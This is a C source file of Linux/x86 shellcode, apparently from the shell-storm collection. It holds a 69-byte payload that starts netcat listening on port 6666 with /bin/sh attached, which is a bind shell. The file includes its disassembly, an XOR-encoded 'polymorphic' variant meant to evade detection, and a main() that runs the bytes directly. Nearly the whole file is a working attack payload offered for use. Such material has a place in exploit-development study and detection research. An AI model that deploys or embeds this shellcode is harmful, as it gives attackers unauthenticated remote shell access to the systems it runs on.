/*
** Title:     Linux/x86 - netcat bindshell port 6666 - 69 bytes
** Date:      2011-04-20
** Author:    Jonathan Salwan
**
** http://shell-storm.org
** http://twitter.com/jonathansalwan
**
** /usr/bin/netcat -ltp6666 -e/bin/sh
**
** 8048054 <.text>:
** 8048054:	31 c0                	xor    %eax,%eax
** 8048056:	50                   	push   %eax
** 8048057:	68 74 63 61 74       	push   $0x74616374
** 804805c:	68 6e 2f 6e 65       	push   $0x656e2f6e
** 8048061:	68 72 2f 62 69       	push   $0x69622f72
** 8048066:	68 2f 2f 75 73       	push   $0x73752f2f
** 804806b:	89 e3                	mov    %esp,%ebx
** 804806d:	50                   	push   %eax
** 804806e:	68 36 36 36 36       	push   $0x36363636
** 8048073:	68 2d 6c 74 70       	push   $0x70746c2d
** 8048078:	89 e2                	mov    %esp,%edx
** 804807a:	50                   	push   %eax
** 804807b:	68 6e 2f 73 68       	push   $0x68732f6e
** 8048080:	68 2f 2f 62 69       	push   $0x69622f2f
** 8048085:	66 68 2d 65          	pushw  $0x652d
** 8048089:	89 e1                	mov    %esp,%ecx
** 804808b:	50                   	push   %eax
** 804808c:	51                   	push   %ecx
** 804808d:	52                   	push   %edx
** 804808e:	53                   	push   %ebx
** 804808f:	89 e6                	mov    %esp,%esi
** 8048091:	b0 0b                	mov    $0xb,%al
** 8048093:	89 f1                	mov    %esi,%ecx
** 8048095:	31 d2                	xor    %edx,%edx
** 8048097:	cd 80                	int    $0x80
**
*/


#include <stdio.h>
#include <string.h>

char SC[] = "\x31\xc0\x50\x68\x74\x63\x61\x74\x68\x6e\x2f"
            "\x6e\x65\x68\x72\x2f\x62\x69\x68\x2f\x2f\x75"
            "\x73\x89\xe3\x50\x68\x36\x36\x36\x36\x68\x2d"
            "\x6c\x74\x70\x89\xe2\x50\x68\x6e\x2f\x73\x68"
            "\x68\x2f\x2f\x62\x69\x66\x68\x2d\x65\x89\xe1"
            "\x50\x51\x52\x53\x89\xe6\xb0\x0b\x89\xf1\x31"
            "\xd2\xcd\x80";


                /*  SC polymorphic - XOR 19 - 93 bytes  */
char SC_ENC[] = "\xeb\x11\x5e\x31\xc9\xb1\x45\x80\x74\x0e"
                "\xff\x13\x80\xe9\x01\x75\xf6\xeb\x05\xe8"
                "\xea\xff\xff\xff\x22\xd3\x43\x7b\x67\x70"
                "\x72\x67\x7b\x7d\x3c\x7d\x76\x7b\x61\x3c"
                "\x71\x7a\x7b\x3c\x3c\x66\x60\x9a\xf0\x43"
                "\x7b\x25\x25\x25\x25\x7b\x3e\x7f\x67\x63"
                "\x9a\xf1\x43\x7b\x7d\x3c\x60\x7b\x7b\x3c"
                "\x3c\x71\x7a\x75\x7b\x3e\x76\x9a\xf2\x43"
                "\x42\x41\x40\x9a\xf5\xa3\x18\x9a\xe2\x22"
                "\xc1\xde\x93";

int main(void)
{
        fprintf(stdout,"Length: %d\n",strlen(SC));
        (*(void(*)()) SC)();
return 0;
}